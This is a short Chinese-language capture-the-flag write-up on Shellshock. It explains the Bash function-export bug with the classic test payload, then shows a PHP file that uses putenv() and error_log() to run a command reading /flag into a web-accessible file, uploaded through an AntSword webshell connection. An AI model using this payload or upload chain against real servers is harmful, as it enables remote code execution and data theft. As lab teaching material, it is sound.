## Shellshock 提权

**漏洞本质**

Bash 在处理 “函数定义” 的环境变量时会**继续执行函数体后多余的字符串内容**，即使它不是合法的函数定义

**✅ 1. 正常的函数环境变量行为（示例）**

```bash
env 'foo=() { echo hello; }' bash -c "echo done"

# `foo` 被定义成一个函数，Bash 会正常识别它
```

**❌ 2. 漏洞触发示例（Shellshock Payload）**

```bash
env 'foo=() { :;}; echo vulnerable' bash -c "echo test"

# foo=() { :;}; echo vulnerable 看起来像一个函数定义：
	# foo=() { :;} 是合法函数定义（:; 是 NOP）
	# 但后续跟着 ; echo vulnerable，却被 Bash 误当作要执行的代码
# bash -c "echo test" 本意是执行 echo test，但由于 Bash 解析 foo 时“附带执行”了 echo vulnerable 
```

```bash
# 输出
vulnerable
test
```

网页给出了后门密码

![](https://pic1.imgdb.cn/item/68808da958cb8da5c8ce8c17.png)

蚁剑直接连接

![](https://pic1.imgdb.cn/item/68808dc458cb8da5c8ce8e5f.png)

构造 RCE 代码，[参考博客](https://a1andns.github.io/post/CTFHUB%E6%8A%80%E8%83%BD%E6%A0%91WEB%E8%BF%9B%E9%98%B6)

```php
<?php
   # putenv() 用于设置环境变量
   putenv("PHP_test=() { :; }; tac /flag >> /var/www/html/a1andns");
   error_log("admin",1);。
   echo 'ok';// 便于判断是否运行成功
?>
```

右键上传文件

![](https://pic1.imgdb.cn/item/68808f3458cb8da5c8ceac2f.png)

浏览器访问出现 OK

![](https://pic1.imgdb.cn/item/6880907958cb8da5c8cebe76.png)

![](https://pic1.imgdb.cn/item/688090ae58cb8da5c8cec113.png)
